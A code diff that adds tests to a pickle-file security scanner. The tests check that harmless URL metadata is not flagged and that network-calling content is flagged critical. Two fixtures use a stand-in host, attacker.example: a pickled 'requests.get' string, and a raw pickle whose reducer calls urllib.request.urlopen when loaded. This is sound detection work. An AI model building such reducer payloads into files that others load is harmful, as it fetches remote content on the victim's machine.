@@ -1439,6 +1439,61 @@ def test_scan_stream_does_not_treat_system_name_as_setitem_cve() -> None:
     assert all(issue.rule_code != "S209" for issue in result.issues)
 
 
+def test_scan_stream_allows_inert_pickle_url_literals_without_critical_s310() -> None:
+    payload = pickle.dumps(
+        {
+            "license": "https://ultralytics.com/license",
+            "docs": "https://docs.ultralytics.com/reference/os.system(command)",
+            "repository": "https://github.com/ultralytics/ultralytics",
+        },
+        protocol=0,
+    )
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="url-metadata.pkl")
+
+    assert result.success is True
+    assert not any(issue.rule_code == "S310" and issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
+
+
+def test_scan_stream_keeps_executable_network_literal_actionable() -> None:
+    payload = pickle.dumps(
+        {
+            "docs": "https://docs.example.invalid/reference/requests.get(url)",
+            "loader": "requests.get('https://attacker.example/payload')",
+        },
+        protocol=0,
+    )
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="network-code.pkl")
+
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "network_function"
+        and issue.details.get("function") == "requests.get"
+        for issue in result.issues
+    )
+    assert any(
+        issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("pattern_type") == "url"
+        for issue in result.issues
+    )
+
+
+def test_scan_stream_keeps_network_url_reducer_actionable() -> None:
+    payload = b"curllib.request\nurlopen\n(Vhttps://attacker.example/payload\ntR."
+
+    result = PickleScanner().scan_stream(io.BytesIO(payload), len(payload), source="network-reducer.pkl")
+
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("pickle_rule_code") == "DANGEROUS_CALL"
+        and issue.details.get("associated_global") == "urllib.request.urlopen"
+        for issue in result.issues
+    )
+
+
 def test_scan_stream_accepts_unknown_size_stream() -> None:
     payload = pickle.dumps({"safe": True}, protocol=4)
 
